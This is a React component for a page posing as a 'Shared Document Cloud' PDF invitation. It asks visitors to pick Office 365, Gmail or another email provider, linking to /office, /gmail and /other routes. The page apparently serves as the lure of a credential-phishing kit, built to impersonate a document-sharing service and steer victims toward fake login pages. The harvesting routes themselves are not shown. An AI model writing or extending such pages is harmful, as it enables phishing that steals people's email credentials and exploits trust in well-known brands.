import './App.css';
import './Hover.css';
import './DemoPage.css';
import React from 'react';

function App() {


  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image" 
     style={{backgroundColor: "#fdfdfd",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
              <div className='text-center pt-5'>
   <img src="images/icro.png"  className="img-fluid" width="120px" height="90px"/>
   </div>
      <div  className="container">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-5 shadow bg-white rounded">
        <div  className="text-center pt-4"> 
               
                <span  className="h5 text-dark">Select your email provider</span> <br/>
               <hr className="mt-3"  style={{  backgroundColor: "black", width: "300px", border: "none"}} />
              
              </div>
              <p  style={{fontSize:"14px"}}>You have been invited to view:</p>
           <h5 className='pt-2'>   <img src="images/pdf.png"  className="img-fluid" width="45px" height="5px"/> Shared PDF Documents </h5>
           <p className='font-weight-light mb-2 mt-2' style={{fontSize:"14px"}} >To view the secure document ,<br/>
           Please select your email provider below.</p>

          <a href="/office" > <img src="images/office365.png"  className="img-fluid px-1" width="65px" height="5px"/> </a>
     
          <a href="/gmail" > <img src="images/gmail.jpg"  className="img-fluid px-1" width="65px" height="5px"/>  </a>
          <a href="/other" >  <img src="images/otherem.png"  className="img-fluid px-1" width="65px" height="5px"/>  </a>

          </div>

       

    

          </div>
     
    </div> 
    <center>
    <p className='font-weight-light' style={{fontSize:"12px"}}>© 2022 Shared Document Cloud  Privacy Cookies</p>
    </center>
    </div>
  </div>
  </div>
  );
}

export default App;
